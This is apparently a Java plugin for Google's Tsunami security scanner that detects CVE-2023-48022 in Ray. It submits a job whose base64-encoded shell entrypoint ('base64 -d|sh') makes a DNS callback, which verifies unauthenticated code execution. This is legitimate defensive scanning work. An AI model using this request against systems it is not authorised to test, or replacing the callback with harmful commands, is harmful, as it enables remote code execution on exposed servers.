/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.cve202348022;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.BaseEncoding;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A VulnDetector plugin for CVE 202348022. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2023-48022 Detector",
    version = "0.1",
    description = "This detector checks for occurrences of CVE-2023-48022 in ray installations.",
    author = "Marius Steffens (mariussteffens@google.com)",
    bootstrapModule = Cve202348022DetectorModule.class)
@ForWebService
public final class Cve202348022Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve202348022Detector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    var payload = getTsunamiCallbackHttpPayload();

    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log(
          "Tsunami callback server is not setup for this environment, cannot run CVE-2023-48022"
              + " Detector.");
      return false;
    }

    var requestWithPayloadOldVersion =
        getExploitRequest(networkService, payload, "api/job_agent/jobs/");
    var requestWithPayloadNewVersion = getExploitRequest(networkService, payload, "api/jobs/");

    this.sendRequest(requestWithPayloadOldVersion, networkService);
    this.sendRequest(requestWithPayloadNewVersion, networkService);

    return payload.checkIfExecuted();
  }

  private Payload getTsunamiCallbackHttpPayload() {
    return this.payloadGenerator.generate(
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
            .build());
  }

  private HttpRequest getExploitRequest(
      NetworkService networkService, Payload payload, String apiEndpoint) {
    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String body = String.format("{\"entrypoint\": \"%s\"}", getShellCodeForDnsCallback(payload));
    return HttpRequest.post(rootUrl + apiEndpoint)
        .setHeaders(HttpHeaders.builder().addHeader("content-type", "application/json").build())
        .setRequestBody(ByteString.copyFromUtf8(body))
        .build();
  }

  private String getShellCodeForDnsCallback(Payload payload) {
    String pythonDnsCallbackCode =
        String.format(
            "python3 -c 'import socket;socket.gethostbyname(\"%s\")'", payload.getPayload());
    return String.format(
        "echo %s|base64 -d|sh",
        BaseEncoding.base64().encode(pythonDnsCallbackCode.getBytes(UTF_8)));
  }

  private void sendRequest(HttpRequest request, NetworkService networkService) {
    try {
      this.httpClient.send(request, networkService);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE-2023-48022"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2023-48022 Arbitrary Code Execution in Ray")
                .setDescription(
                    "An attacker can use the job upload functionality to execute arbitrary code on"
                        + " the server hosting the ray application.")
                .setRecommendation(
                    "There is no patch available as this is considered intended functionality."
                        + " Restrict access to ray to be local only, and do not expose it to the"
                        + " network."))
        .build();
  }
}
